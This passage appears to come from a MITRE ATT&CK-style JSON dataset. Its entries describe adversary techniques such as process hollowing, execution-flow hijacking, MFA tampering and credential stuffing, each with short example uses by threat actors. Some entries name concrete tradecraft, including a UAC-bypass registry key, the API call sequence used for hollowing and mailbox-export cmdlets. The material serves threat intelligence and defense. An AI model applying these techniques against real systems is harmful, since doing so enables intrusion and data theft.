    "description": "Adversaries may abuse inter-process communication (IPC) mechanisms for local code or command execution. IPC is typically used by processes to share data, communicate with each other, or synchronize execution. IPC is also commonly used to avoid situations such as deadlocks, which occurs when processes are stuck in a cyclic waiting pattern. Adversaries may abuse IPC to execute arbitrary code or commands. IPC mechanisms may differ depending on OS, but typically exists in a form accessible through programming languages/libraries or native interfaces such as Windows [Dynamic Data Exchange](https://attack.mitre.org/techniques/T1559/002) or [Component Object Model](https://attack.mitre.org/techniques/T1559/001). Linux environments support several different IPC mechanisms, two of which being sockets and pipes.(Citation: Linux IPC) Higher level execution mediums, such as those of [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059)s, may also leverage underlying IPC mechanisms. Adversaries may also use [Remote Services](https://attack.mitre.org/techniques/T1021) such as [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) to facilitate remote IPC execution.(Citation: Fireeye Hunting COM June 2019)",
    "similar_words": [
      "Inter-Process Communication"
    ],
    "id": "T1559"
  },
  "attack-pattern--ae797531-3219-49a4-bccf-324ad7a4c7b2": {
    "name": "Web Services",
    "example_uses": [
      "has frequently used compromised WordPress sites for C2 infrastructure.",
      "has compromised Google Drive repositories.",
      "can insert malicious scripts to compromise vulnerable content management systems (CMS).",
      "has compromised legitimate websites to enable strategic website compromise attacks.",
      "has used compromised WordPress sites to host malicious payloads for download.",
      "During  threat actors abused compromised AWS buckets to store files."
    ],
    "description": "Adversaries may compromise access to third-party web servicesthat can be used during targeting. A variety of popular websites exist for legitimate users to register for web-based services, such as GitHub, Twitter, Dropbox, Google, SendGrid, etc. Adversaries may try to take ownership of a legitimate user's access to a web service and use that web service as infrastructure in support of cyber operations. Such web services can be abused during later stages of the adversary lifecycle, such as during Command and Control ([Web Service](https://attack.mitre.org/techniques/T1102)), [Exfiltration Over Web Service](https://attack.mitre.org/techniques/T1567), or [Phishing](https://attack.mitre.org/techniques/T1566).(Citation: Recorded Future Turla Infra 2020) Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. By utilizing a web service, particularly when access is stolen from legitimate users, adversaries can make it difficult to physically tie back operations to them. Additionally, leveraging compromised web-based email services may allow adversaries to leverage the trust associated with legitimate domains.",
    "similar_words": [
      "Web Services"
    ],
    "id": "T1584.006"
  },
  "attack-pattern--ae7f3575-0a5e-427e-991b-fe03ad44c754": {
    "name": "Modify System Image",
    "example_uses": [],
    "description": "Adversaries may make changes to the operating system of embedded network devices to weaken defenses and provide new capabilities for themselves.  On such devices, the operating systems are typically monolithic and most of the device functionality and capabilities are contained within a single file.To change the operating system, the adversary typically only needs to affect this one file, replacing or modifying it.  This can either be done live in memory during system runtime for immediate effect, or in storage to implement the change on the next boot of the network device.",
    "similar_words": [
      "Modify System Image"
    ],
    "id": "T1601"
  },
  "attack-pattern--aedfca76-3b30-4866-b2aa-0f1d7fd1e4b6": {
    "name": "Hijack Execution Flow",
    "example_uses": [
      "edits the Registry key HKCU\\Software\\Classes\\mscfile\\shell\\open\\command to execute a malicious AutoIt script. When eventvwr.exe is executed this will call the Microsoft Management Console (mmc.exe) which in turn references the modified Registry key.",
      "One of  can replace the normal flow of a program execution with malicious code.",
      "can hijack the cryptbase.dll within migwiz.exe to escalate privileges and bypass UAC controls.",
      "replaces the nonexistent Windows DLL msfte.dll with its own malicious version which is loaded by the SearchIndexer.exe and SearchProtocolHost.exe.",
      "During   established persistence by loading malicious libraries via modifications to the Import Address Table (IAT) within legitimate Microsoft binaries.",
      "will remove and write malicious shared objects associated with legitimate system functions such as `read(2)`.",
      "will drop a copy of itself to a subfolder in %Program Data% or %Program Data%\\\\Microsoft\\\\ to attempt privilege elevation and defense evasion if not running in Session 0.",
      "utilized a tampered legitimate executable `grepWinNP3.exe` for its first stage  loader modifying the open-source tool to execute malicious code when launched.",
      "uses a legitimate executable to load a malicious DLL file for installation.",
      "will use the malicious file slideshow.mp4 if present to load the core API provided by ntdll.dll to avoid any hooks placed on calls to the original ntdll.dll file by endpoint detection and response or antimalware software."
    ],
    "description": "Adversaries may execute their own malicious payloads by hijacking the way operating systems run programs. Hijacking execution flow can be for the purposes of persistence, since this hijacked execution may reoccur over time. Adversaries may also use these mechanisms to elevate privileges or evade defenses, such as application control or other restrictions on execution.There are many ways an adversary may hijack the flow of execution, including by manipulating how the operating system locates programs to be executed. How the operating system locates libraries to be used by a program can also be intercepted. Locations where the operating system looks for programs/resources, such as file directories and in the case of Windows the Registry, could also be poisoned to include malicious payloads.",
    "similar_words": [
      "Hijack Execution Flow"
    ],
    "id": "T1574"
  },
  "attack-pattern--b0533c6e-8fea-4788-874f-b799cacc4b92": {
    "name": "Indicator Removal from Tools",
    "example_uses": [
      "The author of  submitted samples to VirusTotal for testing showing that the author modified the code to try to hide the DDE object in a different part of the document.",
      "includes a capability to modify the Beacon payload to eliminate known signatures or unpacking methods.",
      "apparently altered  samples by adding four bytes of random letters in a likely attempt to change the file hashes.",
      "Find-AVSignature AntivirusBypass module can be used to locate single byte anti-virus signatures.",
      "has updated and modified its malware resulting in different hash values that evade detection.",
      "ensured each payload had a unique hash including by using different types of packers.",
      "can remove strings from binaries.",
      "During  threat actors edited variable names within the  suite to avoid automated detection.",
      "can make small changes to itself in order to change its checksum and hash value.",
      "In the   modified files based on the open-source project cryptcat in an apparent attempt to decrease anti-virus detection rates.",
      "can scramble functions not to be executed again with random values.",
      "Analysis of  has shown that it regularly undergoes technical improvements to evade anti-virus detection.",
      "source code used generic variable names and pre-obfuscated strings and was likely sanitized of developer comments before being added to .",
      "has undergone regular technical improvements in an attempt to evade detection.",
      "has tested malware samples to determine AV detection and subsequently modified the samples to ensure AV evasion.",
      "Based on comparison of  versions  made an effort to obfuscate strings in the malware that could be used as IoCs including the mutex name and named pipe.",
      "has been known to remove indicators of compromise from tools."
    ],
    "description": "Adversaries may remove indicators from tools if they believe their malicious tool was detected, quarantined, or otherwise curtailed. They can modify the tool by removing the indicator and using the updated version that is no longer detected by the target's defensive systems or subsequent targets that may use similar systems.A good example of this is when malware is detected with a file signature and quarantined by anti-virus software. An adversary who can determine that the malware was quarantined because of its file signature may modify the file to explicitly avoid that signature, and then re-use the malware.",
    "similar_words": [
      "Indicator Removal from Tools"
    ],
    "id": "T1027.005"
  },
  "attack-pattern--b0c74ef9-c61e-4986-88cb-78da98a355ec": {
    "name": "Malicious Image",
    "example_uses": [
      "has relied on users to download and execute malicious Docker images."
    ],
    "description": "Adversaries may rely on a user running a malicious image to facilitate execution. Amazon Web Services (AWS) Amazon Machine Images (AMIs), Google Cloud Platform (GCP) Images, and Azure Images as well as popular container runtimes such as Docker can be backdoored. Backdoored images may be uploaded to a public repository via [Upload Malware](https://attack.mitre.org/techniques/T1608/001), and users may then download and deploy an instance or container from the image without realizing the image is malicious, thus bypassing techniques that specifically achieve Initial Access. This can lead to the execution of malicious code, such as code that executes cryptocurrency mining, in the instance or container.(Citation: Summit Route Malicious AMIs)Adversaries may also name images a certain way to increase the chance of users mistakenly deploying an instance or container from the image (ex: [Match Legitimate Resource Name or Location](https://attack.mitre.org/techniques/T1036/005)).(Citation: Aqua Security Cloud Native Threat Report June 2021)",
    "similar_words": [
      "Malicious Image"
    ],
    "id": "T1204.003"
  },
  "attack-pattern--b0e54bf7-835e-4f44-bd8e-62f431b9b76a": {
    "name": "Container Service",
    "example_uses": [],
    "description": "Adversaries may create or modify container or container cluster management tools that run as daemons, agents, or services on individual hosts. These include software for creating and managing individual containers, such as Docker and Podman, as well as container cluster node-level agents such as kubelet. By modifying these services, an adversary may be able to achieve persistence or escalate their privileges on a host.For example, by using the `docker run` or `podman run` command with the `restart=always` directive, a container can be configured to persistently restart on the host.(Citation: AquaSec TeamTNT 2023) A user with access to the (rootful) docker command may also be able to escalate their privileges on the host.(Citation: GTFOBins Docker)In Kubernetes environments, DaemonSets allow an adversary to persistently [Deploy Container](https://attack.mitre.org/techniques/T1610)s on all nodes, including ones added later to the cluster.(Citation: Aquasec Kubernetes Attack 2023)(Citation: Kubernetes DaemonSet) Pods can also be deployed to specific nodes using the `nodeSelector` or `nodeName` fields in the pod spec.(Citation: Kubernetes Assigning Pods to Nodes)(Citation: AppSecco Kubernetes Namespace Breakout 2020)Note that containers can also be configured to run as [Systemd Service](https://attack.mitre.org/techniques/T1543/002)s.(Citation: Podman Systemd)(Citation: Docker Systemd)",
    "similar_words": [
      "Container Service"
    ],
    "id": "T1543.005"
  },
  "attack-pattern--b18eae87-b469-4e14-b454-b171b416bc18": {
    "name": "Non-Standard Port",
    "example_uses": [
      "has used HTTPS over ports 2083 and 2087 for C2.",
      "has used port 444 when sending data about the system from the client to the server.",
      "can use HTTPS over port 8080 for C2.",
      "has used HTTP over ports such as 20 22 443 7080 and 50000 in addition to using ports commonly associated with HTTP/S.",
      "has used HTTPS over port 1402 in C2 communication.",
      "used TLS to encrypt communications over port 143",
      "has used HTTP over ports 9005 and 9006 for network traffic 9002 for C2 requests 33666 as a WebSocket and 8090 to download files.",
      "has used port 4585 for a TCP connection to its C2.",
      "During  the threat actors used uncommon high ports for its backdoor C2 including ports 25667 and 47000.",
      "has been observed using TCP port 25 without using SMTP to leverage an open port for secure command and control communications.",
      "has connected outbound over TCP port 443 with a FakeTLS method.",
      "can use ports 1985 and 1986 in HTTP/S communication.",
      "communicates over ports 80 443 53 and 8080 via raw sockets instead of the protocols usually associated with the ports.",
      "An  backdoor can use HTTP over a non-standard TCP port (e.g 14146) which is specified in the backdoor configuration.",
      "During  the threat actors opened a variety of ports including ports 28035 32467 41578 and 46892 to establish RDP connections.",
      "binds and listens on port 443 with a FakeTLS method.",
      "has used a custom binary protocol over TCP port 443 for C2.",
      "has communicated with hosts over raw TCP on port 9999.",
      "During the  campaign  used port-protocol mismatches on ports such as 443 4444 8531 and 50501 during C2.",
      "has used a custom RC4 and XOR encrypted protocol over port 443 for C2.",
      "has used port 6789 to accept connections on the group's SSH server.",
      "Some  malware uses a list of ordered port numbers to choose a port for C2 traffic creating port-protocol mismatches.",
      "has used port 1177 for HTTP C2 communications.",
      "has used port-protocol mismatches on ports such as 53 80 443 and 8080 during C2.",
      "has the ability to connect with actor-controlled C2 servers using a custom binary protocol over port 443.",
      "has used TCP port 5633 for C2 Communication.",
      "has used unencrypted HTTP on port 443 for C2.",
      "uses a custom binary protocol over TCP port 443.",
      "used Port 44443 for its VNC module.",
      "malware has communicated with its C2 server over TCP ports 4443 and 10151 using HTTP.",
      "Some  samples have used HTTP over ports 447 and 8082 for C2. Newer versions of  have been known to use a custom communication protocol which sends the data unencrypted over port 443.",
      "can use port 4782 on the compromised host for TCP callbacks.",
      "communicates on ports 443 and 8000 with a FakeTLS method.",
      "used ports 5190 and 7900 for shellcode listeners and 4444 4445 31337 for shellcode C2.",
      "has used ports 443 8080 and 8443 with a FakeTLS method.",
      "has used port 4050 for C2 communications.",
      "has used HTTP over a non-standard port such as TCP port 46769.",
      "has used HTTP over TCP ports 808 and 880 for command and control.",
      "binds and listens on port 1058 for HTTP traffic while also utilizing a FakeTLS method.",
      "can use HTTP over non-standard ports such as 995 for C2.",
      "can use non-standard ports for C2 not typically associated with HTTP or HTTPS traffic.",
      "miner connects to a C2 server using port 51640.",
      "listeners and controllers can be configured to use non-standard ports.",
      "will communicate via HTTP over port 8080 for command and control traffic.",
      "has used various non-standard ports for C2 communication.",
      "uses non-standard ports such as 2967 2223 and others for HTTPS command and control communication.",
      "generates a random port number greater than 30000 to serve as the listener for subsequent command and control activity.",
      "uses non-standard listening ports such as UDP 5900 for command and control purposes.",
      "has used non-standard ports such as TCP 8080 for HTTP communication.",
      "has used random high number ports for  listeners on victim devices.",
      "has used random high-number non-standard ports to listen for subsequent actions and C2 activities.",
      "During   used non-standard ports such as TCP 8080 for HTTP communication."
    ],
    "description": "Adversaries may communicate using a protocol and port pairing that are typically not associated. For example, HTTPS over port 8088(Citation: Symantec Elfin Mar 2019) or port 587(Citation: Fortinet Agent Tesla April 2018) as opposed to the traditional port 443. Adversaries may make changes to the standard port used by a protocol to bypass filtering or muddle analysis/parsing of network data.Adversaries may also make changes to victim systems to abuse non-standard ports. For example, Registry keys and other configuration settings can be used to modify protocol and port pairings.(Citation: change_rdp_port_conti)",
    "similar_words": [
      "Non-Standard Port"
    ],
    "id": "T1571"
  },
  "attack-pattern--b1ccd744-3f78-4a0e-9bb2-2002057f7928": {
    "name": "Social Media Accounts",
    "example_uses": [
      "has established social media accounts to disseminate victim internal-only documents and other sensitive data.",
      "For   created fake LinkedIn accounts for their targeting efforts.",
      "has established social media profiles to mimic employees of targeted companies.",
      "has established fraudulent LinkedIn accounts impersonating HR department employees to target potential victims with fake job offers.",
      "has created social media accounts to monitor news and security trends as well as potential targets.",
      "has created new social media accounts for targeting efforts.",
      "has established a network of fictitious social media accounts including on Facebook and LinkedIn to establish relationships with victims often posing as an attractive woman.",
      "has created fake LinkedIn profiles that included profile photos details and connections.",
      "For   registered Twitter accounts to host C2 nodes.",
      "has created new Twitter accounts to conduct social engineering against potential victims.",
      "has set up Facebook pages in tandem with fake websites.",
      "has used a Twitter account to communicate with ransomware victims.",
      "has created fake LinkedIn and other social media accounts to contact targets and convince them--through messages and voice communications--to open malicious links.",
      "has established fraudulent profiles on professional networking sites to conduct reconnaissance.",
      "has created social media accounts to interact with victims."
    ],
    "description": "Adversaries may create and cultivate social media accounts that can be used during targeting. Adversaries can create social media accounts that can be used to build a persona to further operations. Persona development consists of the development of public information, presence, history and appropriate affiliations.(Citation: NEWSCASTER2014)(Citation: BlackHatRobinSage)For operations incorporating social engineering, the utilization of a persona on social media may be important. These personas may be fictitious or impersonate real people. The persona may exist on a single social media site or across multiple sites (ex: Facebook, LinkedIn, Twitter, etc.). Establishing a persona  on social media may require development of additional documentation to make them seem real. This could include filling out profile information, developing social networks, or incorporating photos. Once a persona has been developed an adversary can use it to create connections to targets of interest. These connections may be direct or may include trying to connect through others.(Citation: NEWSCASTER2014)(Citation: BlackHatRobinSage) These accounts may be leveraged during other phases of the adversary lifecycle, such as during Initial Access (ex: [Spearphishing via Service](https://attack.mitre.org/techniques/T1566/003)).",
    "similar_words": [
      "Social Media Accounts"
    ],
    "id": "T1585.001"
  },
  "attack-pattern--b200542e-e877-4395-875b-cf1a44537ca4": {
    "name": "Process Hollowing",
    "example_uses": [
      "malware can use process hollowing to inject one of its trojans into another process.",
      "A  tool can spawn `svchost.exe` and inject the payload into that process.",
      "can launch itself from a hollowed svchost.exe process.",
      "performed process hollowing through the API calls CreateRemoteThread ResumeThread and Wow64SetThreadContext.",
      "can create a suspended notepad process and write shellcode to delete a file into the suspended process using `NtWriteVirtualMemory`.",
      "can decrypt the payload into memory create a new suspended process of itself then inject a decrypted payload to the new process and resume new process execution.",
      "A  payload uses process hollowing to hide the UAC bypass vulnerability exploitation inside svchost.exe.",
      "can use process hollowing to execute its main payload.",
      "can use process hollowing for execution.",
      "has used process hollowing to inject itself into legitimate Windows process.",
      "can use RunPE to execute malicious payloads within a hollowed Windows process.",
      "has been launched by starting iexplore.exe and replacing it with 's payload.",
      "spawns a new copy of c:\\windows\\syswow64\\explorer.exe and then replaces the executable code in memory with malware.",
      "can create a new process in a suspended state from a targeted legitimate process in order to unmap its memory and replace it with malicious code.",
      "has used process hollowing shellcode to target a predefined list of processes from %SYSTEM32%.",
      "has used process hollowing to execute CyberGate malware.",
      "has the ability to inject its fourth stage into a suspended process created by the legitimate Windows utility `InstallUtil.exe`.",
      "has a command to download an .exe and use process hollowing to inject it into a new process.",
      "can execute binaries through process hollowing.",
      "has used process hollowing in iexplore.exe to load the  implant.",
      "hollows out a newly created process RegASM.exe and injects its payload into the hollowed process.",
      "The  loader has used API calls to spawn `MSBuild.exe` in a suspended state before injecting the decrypted  binary into it.",
      "The  payload has been injected into benign Microsoft executables via process hollowing.",
      "has used process hollowing to create and manipulate processes through sections of unmapped memory by reallocating that space with its malicious code.",
      "Some  versions have an embedded DLL known as MockDll that uses process hollowing and  to execute another payload.",
      "injects into the svchost.exe process.",
      "has used process hollowing to inject into child processes.",
      "has used a file injector DLL to spawn a benign process on the victim's system and inject the malicious payload into it via process hollowing.",
      "can inject into a target process including Svchost Explorer and cmd using process hollowing.",
      "has been seen loaded into msiexec.exe through process hollowing to hide its execution.",
      "is capable of loading executable code via process hollowing.",
      "leverages process hollowing techniques to evade detection such as decrypting the content of an encrypted PE file and injecting it into the process vbc.exe.",
      "can inject a  beacon into cmd.exe via process hallowing.",
      "will execute a legitimate process then suspend it to inject code for a  client into the process followed by resumption of the process to enable  client execution.",
      "can inject its Delphi executable into ImagingDevices.exe using a process hollowing technique.",
      "uses a copy of `certutil.exe` stored in a temporary directory for process hollowing starting the program in a suspended state before loading malicious code.",
      "uses process hollowing by injecting itself into the `explorer.exe` process and other files ithin the Windows `SysWOW64` directory.",
      "has used process hollowing leveraging a legitimate program such as BitLockerToGo.exe to inject a malicious payload.",
      "used process hollowing for defense evasion purposes."
    ],
    "description": "Adversaries may inject malicious code into suspended and hollowed processes in order to evade process-based defenses. Process hollowing is a method of executing arbitrary code in the address space of a separate live process.  Process hollowing is commonly performed by creating a process in a suspended state then unmapping/hollowing its memory, which can then be replaced with malicious code. A victim process can be created with native Windows API calls such as CreateProcess, which includes a flag to suspend the processes primary thread. At this point the process can be unmapped using APIs calls such as ZwUnmapViewOfSection or NtUnmapViewOfSection  before being written to, realigned to the injected code, and resumed via VirtualAllocEx, WriteProcessMemory, SetThreadContext, then ResumeThread respectively.(Citation: Leitch Hollowing)(Citation: Elastic Process Injection July 2017)This is very similar to [Thread Local Storage](https://attack.mitre.org/techniques/T1055/005) but creates a new process rather than targeting an existing process. This behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process. However, execution via process hollowing may also evade detection from security products since the execution is masked under a legitimate process. ",
    "similar_words": [
      "Process Hollowing"
    ],
    "id": "T1055.012"
  },
  "attack-pattern--b22e5153-ac28-4cc6-865c-2054e36285cb": {
    "name": "Resource Forking",
    "example_uses": [
      "uses a resource fork to present a macOS JPEG or text file icon rather than the executable's icon assigned by the operating system.",
      "has used a resource fork to hide a compressed binary file of itself from the terminal Finder and potentially evade traditional scanners."
    ],
    "description": "Adversaries may abuse resource forks to hide malicious code or executables to evade detection and bypass security applications. A resource fork provides applications a structured way to store resources such as thumbnail images, menu definitions, icons, dialog boxes, and code.(Citation: macOS Hierarchical File System Overview) Usage of a resource fork is identifiable when displaying a files extended attributes, using ls -l@ or xattr -l commands. Resource forks have been deprecated and replaced with the application bundle structure. Non-localized resources are placed at the top level directory of an application bundle, while localized resources are placed in the /Resources folder.(Citation: Resource and Data Forks)(Citation: ELC Extended Attributes)Adversaries can use resource forks to hide malicious data that may otherwise be stored directly in files. Adversaries can execute content with an attached resource fork, at a specified offset, that is moved to an executable location then invoked. Resource fork content may also be obfuscated/encrypted until execution.(Citation: sentinellabs resource named fork 2020)(Citation: tau bundlore erika noerenberg 2020)",
    "similar_words": [
      "Resource Forking"
    ],
    "id": "T1564.009"
  },
  "attack-pattern--b24e2a20-3b3d-4bf0-823b-1ed765398fb0": {
    "name": "Account Access Removal",
    "example_uses": [
      "deletes administrator accounts in victim networks prior to encryption.",
      "has changed user account passwords and logged users off the system.",
      "has been observed changing account passwords and logging off current users.",
      "has the ability to change the password of local users on compromised hosts and can log off users.",
      "has removed a targeted organization's global admin accounts to lock the organization out of all access.",
      "changes the password for local and domain users via net.exe to a random 32 character string to prevent these accounts from logging on. Additionally  will terminate the winlogon.exe process to prevent attempts to log on to the infected system."
    ],
    "description": "Adversaries may interrupt availability of system and network resources by inhibiting access to accounts utilized by legitimate users. Accounts may be deleted, locked, or manipulated (ex: changed credentials) to remove access to accounts. Adversaries may also subsequently log off and/or perform a [System Shutdown/Reboot](https://attack.mitre.org/techniques/T1529) to set malicious changes into place.(Citation: CarbonBlack LockerGoga 2019)(Citation: Unit42 LockerGoga 2019)In Windows, [Net](https://attack.mitre.org/software/S0039) utility, Set-LocalUser and Set-ADAccountPassword [PowerShell](https://attack.mitre.org/techniques/T1059/001) cmdlets may be used by adversaries to modify user accounts. Accounts could also be disabled by Group Policy. In Linux, the passwd utility may be used to change passwords. On ESXi servers, accounts can be removed or modified via esxcli (`system account set`, `system account remove`).Adversaries who use ransomware or similar attacks may first perform this and other Impact behaviors, such as [Data Destruction](https://attack.mitre.org/techniques/T1485) and [Defacement](https://attack.mitre.org/techniques/T1491), in order to impede incident response/recovery before completing the [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486) objective. ",
    "similar_words": [
      "Account Access Removal"
    ],
    "id": "T1531"
  },
  "attack-pattern--b2d03cea-aec1-45ca-9744-9ee583c1e1cc": {
    "name": "Credential Stuffing",
    "example_uses": [
      "has used credential stuffing against victim's remote services to obtain valid accounts.",
      "uses brute-force attack against RDP with rdpscanDll module."
    ],
    "description": "Adversaries may use credentials obtained from breach dumps of unrelated accounts to gain access to target accounts through credential overlap. Occasionally, large numbers of username and password pairs are dumped online when a website or service is compromised and the user account credentials accessed. The information may be useful to an adversary attempting to compromise accounts by taking advantage of the tendency for users to use the same passwords across personal and business accounts.Credential stuffing is a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies.Typically, management services over commonly used ports are used when stuffing credentials. Commonly targeted services include the following:* SSH (22/TCP)* Telnet (23/TCP)* FTP (21/TCP)* NetBIOS / SMB / Samba (139/TCP & 445/TCP)* LDAP (389/TCP)* Kerberos (88/TCP)* RDP / Terminal Services (3389/TCP)* HTTP/HTTP Management Services (80/TCP & 443/TCP)* MSSQL (1433/TCP)* Oracle (1521/TCP)* MySQL (3306/TCP)* VNC (5900/TCP)In addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018)",
    "similar_words": [
      "Credential Stuffing"
    ],
    "id": "T1110.004"
  },
  "attack-pattern--b4409cd8-0da9-46e1-a401-a241afd4d1cc": {
    "name": "Multi-Factor Authentication",
    "example_uses": [
      "After compromising user accounts  registers their own MFA tokens.",
      "can insert malicious logic to bypass RADIUS and ACE two factor authentication (2FA) flows if a designated attacker-supplied password is provided.",
      "The  `Set-AADIntUserMFA` command can be used to disable MFA for a specified user."
    ],
    "description": "Adversaries may disable or modify multi-factor authentication (MFA) mechanisms to enable persistent access to compromised accounts.Once adversaries have gained access to a network by either compromising an account lacking MFA or by employing an MFA bypass method such as [Multi-Factor Authentication Request Generation](https://attack.mitre.org/techniques/T1621), adversaries may leverage their access to modify or completely disable MFA defenses. This can be accomplished by abusing legitimate features, such as excluding users from Azure AD Conditional Access Policies, registering a new yet vulnerable/adversary-controlled MFA method, or by manually patching MFA programs and configuration files to bypass expected functionality.(Citation: Mandiant APT42)(Citation: Azure AD Conditional Access Exclusions)For example, modifying the Windows hosts file (`C:\\windows\\system32\\drivers\\etc\\hosts`) to redirect MFA calls to localhost instead of an MFA server may cause the MFA process to fail. If a \"fail open\" policy is in place, any otherwise successful authentication attempt may be granted access without enforcing MFA. (Citation: Russians Exploit Default MFA Protocol - CISA March 2022) Depending on the scope, goals, and privileges of the adversary, MFA defenses may be disabled for individual accounts or for all accounts tied to a larger group, such as all domain accounts in a victim's network environment.(Citation: Russians Exploit Default MFA Protocol - CISA March 2022) ",
    "similar_words": [
      "Multi-Factor Authentication"
    ],
    "id": "T1556.006"
  },
  "attack-pattern--b4694861-542c-48ea-9eb1-10d356e7140a": {
    "name": "Remote Email Collection",
    "example_uses": [
      "has used compromised credentials and a .NET tool to dump data from Microsoft Exchange mailboxes.",
      "can be used for searching through email in Exchange and Office 365 environments.",
      "During the   collected emails from specific individuals such as executives and IT staff using `New-MailboxExportRequest` followed by `Get-MailboxExportRequest`.",
      "has collected emails from victim Microsoft Exchange servers.",
      "uses two utilities GETMAIL and MAPIGET to steal email. MAPIGET steals email still on Exchange servers that has not yet been archived.",
      "collects Exchange emails matching rules specified in its configuration.",
      "has collected emails from targeted mailboxes within a compromised Azure AD tenant and compromised Exchange servers including via Exchange Web Services (EWS) API requests.",
      "Some  samples have a module to extract email from Microsoft Exchange servers using compromised credentials.",
      "has used web shells to export mailbox data.",
      "can collect sensitive mailing information from Exchange servers including credentials and the domain certificate of an enterprise.",
      "has exported emails from compromised Exchange servers including through use of the cmdlet `New-MailboxExportRequest.`",
      "has harvested data from remote mailboxes including through execution of \\\\<hostname>\\c$\\Users\\<username>\\AppData\\Local\\Microsoft\\Outlook*.ost.",
      "has accessed email accounts using Outlook Web Access.",
      "has accessed and hijacked online email communications using stolen credentials.",
      "used a tool called MailSniper to search through the Exchange server mailboxes for keywords.",
      "has used tools such as the MailFetch mail crawler to collect victim emails (excluding spam) from online services via IMAP.",
      "has remotely accessed victims' email accounts to steal messages and attachments.",
      "During  threat actors made multiple HTTP POST requests to the Exchange servers of the victim organization to transfer data.",
      "has used web shells and MSGraph to export mailbox data."
    ],
    "description": "Adversaries may target an Exchange server, Office 365, or Google Workspace to collect sensitive information. Adversaries may leverage a user's credentials and interact directly with the Exchange server to acquire information from within a network. Adversaries may also access externally facing Exchange services, Office 365, or Google Workspace to access email using credentials or access tokens. Tools such as [MailSniper](https://attack.mitre.org/software/S0413) can be used to automate searches for specific keywords.",
    "similar_words": [
      "Remote Email Collection"
    ],
    "id": "T1114.002"
  },
  "attack-pattern--b46a801b-fd98-491c-a25a-bca25d6e3001": {
    "name": "IIS Components",
    "example_uses": [
      "establishes persistence on webservers as an IIS module.",
      "is an IIS post-exploitation framework consisting of 18 modules that provide several functionalities.",
      "During   targeted Windows servers running Internet Information Systems (IIS) to install C2 components.",
      "has been loaded onto Exchange servers and disguised as an ISAPI filter (owaauth.dll). The IIS w3wp.exe process then loads the malicious DLL."
    ],
    "description": "Adversaries may install malicious components that run on Internet Information Services (IIS) web servers to establish persistence. IIS provides several mechanisms to extend the functionality of the web servers. For example, Internet Server Application Programming Interface (ISAPI) extensions and filters can be installed to examine and/or modify incoming and outgoing IIS web requests. Extensions and filters are deployed as DLL files that export three functions: Get{Extension/Filter}Version, Http{Extension/Filter}Proc, and (optionally) Terminate{Extension/Filter}. IIS modules may also be installed to extend IIS web servers.(Citation: Microsoft ISAPI Extension Overview 2017)(Citation: Microsoft ISAPI Filter Overview 2017)(Citation: IIS Backdoor 2011)(Citation: Trustwave IIS Module 2013)Adversaries may install malicious ISAPI extensions and filters to observe and/or modify traffic, execute commands on compromised machines, or proxy command and control traffic. ISAPI extensions and filters may have access to all IIS web requests and responses. For example, an adversary may abuse these mechanisms to modify HTTP responses in order to distribute malicious commands/content to previously comprised hosts.(Citation: Microsoft ISAPI Filter Overview 2017)(Citation: Microsoft ISAPI Extension Overview 2017)(Citation: Microsoft ISAPI Extension All Incoming 2017)(Citation: Dell TG-3390)(Citation: Trustwave IIS Module 2013)(Citation: MMPC ISAPI Filter 2012)Adversaries may also install malicious IIS modules to observe and/or modify traffic. IIS 7.0 introduced modules that provide the same unrestricted access to HTTP requests and responses as ISAPI extensions and filters. IIS modules can be written as a DLL that exports RegisterModule, or as a .NET application that interfaces with ASP.NET APIs to access IIS HTTP requests.(Citation: Microsoft IIS Modules Overview 2007)(Citation: Trustwave IIS Module 2013)(Citation: ESET IIS Malware 2021)",
    "similar_words": [
      "IIS Components"
    ],
    "id": "T1505.004"
  },
  "attack-pattern--b4b7458f-81f2-4d38-84be-1c5ba0167a52": {
    "name": "Invalid Code Signature",
    "example_uses": [
      "has been incompletely signed with revoked certificates.",
      "is sometimes signed with an invalid Authenticode certificate in an apparent effort to make it look more legitimate.",
      "stage 1 modules for 64-bit systems have been found to be signed with fake certificates masquerading as originating from Microsoft Corporation and Broadcom Corporation.",
      "has signed its malware with an invalid digital certificates listed as Tencent Technology (Shenzhen) Company Limited.",
      "has used revoked certificates to sign malware.",
      "The  client has been signed by fake and invalid digital certificates.",
      "has used an invalid certificate in attempt to appear legitimate.",
      "has used unverified signatures on malicious DLLs."
    ],
    "description": "Adversaries may attempt to mimic features of valid code signatures to increase the chance of deceiving a user, analyst, or tool. Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with. Adversaries can copy the metadata and signature information from a signed program, then use it as a template for an unsigned program. Files with invalid code signatures will fail digital signature validation checks, but they may appear more legitimate to users and security tools may improperly handle these files.(Citation: Threatexpress MetaTwin 2017)Unlike [Code Signing](https://attack.mitre.org/techniques/T1553/002), this activity will not result in a valid signature.",
    "similar_words": [
      "Invalid Code Signature"
    ],
    "id": "T1036.001"
  },
  "attack-pattern--b5327dd1-6bf9-4785-a199-25bcbd1f4a9d": {
    "name": "Run Virtual Instance",
    "example_uses": [
      "operators have used VirtualBox and a Windows 7 virtual machine to run the ransomware; the virtual machine's configuration file mapped the shared network drives of the target company presumably so  can encrypt files on the shared drives as well as the local machine.",
      "has used VirtualBox and a stripped Windows XP virtual machine to run itself. The use of a shared folder specified in the configuration enables  to encrypt files on the host operating system including files on any mapped drives.",
      "has used QEMU and VirtualBox to run a Tiny Core Linux virtual machine which runs XMRig and makes connections to the C2 server for updates."
    ],
